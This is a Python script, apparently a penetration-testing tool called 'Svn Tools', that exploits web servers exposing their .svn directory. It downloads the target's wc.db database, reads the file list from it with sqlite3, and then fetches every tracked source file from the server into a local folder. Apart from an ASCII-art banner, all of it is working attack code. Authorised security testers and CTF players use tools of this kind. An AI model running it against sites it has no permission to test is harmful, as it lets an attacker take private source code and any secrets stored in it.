#!/usr/bin/python3   
#coding:utf-8

__author__ = 'Owen'
import requests
import os
import sys
 
print ('''
 ----
    _____               ______            __    
  / ___/   ______     /_  __/___  ____  / /____
  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/
 ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) 
/____/|___/_/ /_/    /_/  \____/\____/_/____/  
                author: Rivir
 ----
\                             .       .
 \                           / `.   .' " 
  \                  .---.  <    > <    >  .---.
   \                 |    \  \ - ~ ~ - /  /    |
         _____          ..-~             ~-..-~
        |     |   \~~~\.'                    `./~~~/
       ---------   \__/                        \__/
      .'  O    \     /               /       \  " 
     (_____,    `._.'               |         }  \/~~~/
      `----.          /       }     |        /    \__/
            `-.      |       /      |       /      `. ,~~|
                ~-.__|      /_ - ~ ^|      /- _      `..-'   
                     |     /        |     /     ~-.     `-. _  _  _
                     |_____|        |_____|         ~ - . _ _ _ _ _>
 
''')

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}

def getfilename(url):
  with open ('wc.db', 'wb') as f:
    content = requests.get(url=url+'/.svn/wc.db',headers=headers).content
    # http://172.28.100.108/.svn/wc.db
    # print (content)
    f.write(content)
  with open ('svn.txt', 'w') as file:
    info = os.popen("""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || 
      substr(checksum,7) || ".svn-base" as alpha from NODES;'""").read()
    file.write(info)
  #os.remove('wc.db')

def restore_svn(url):
  getfilename(url)
  if not os.path.exists('./svn'):
    os.mkdir('svn')
  with open('svn.txt') as f:
    for file in f:
      tmp = file.strip().split('|')
      if len(tmp) == 1:
        continue
      name = tmp[0]
      path = tmp[1]
      # print (name)
      # print (path)
      if '/' in name:
        book = os.path.dirname(name)
        if not os.path.exists('./svn/' + book):
          os.makedirs('./svn/' + book)
      print ('download:','./svn/' + name)
      try:
        with open ('./svn/' + name,'w') as f:
          # 下载文件
          req = requests.get(url + '/' + path,headers=headers).content
          content = req.decode('utf8','ignore')
          f.write(content) 
      except Exception as e:
        print (e)
if __name__ == '__main__':
    restore_svn(sys.argv[-1])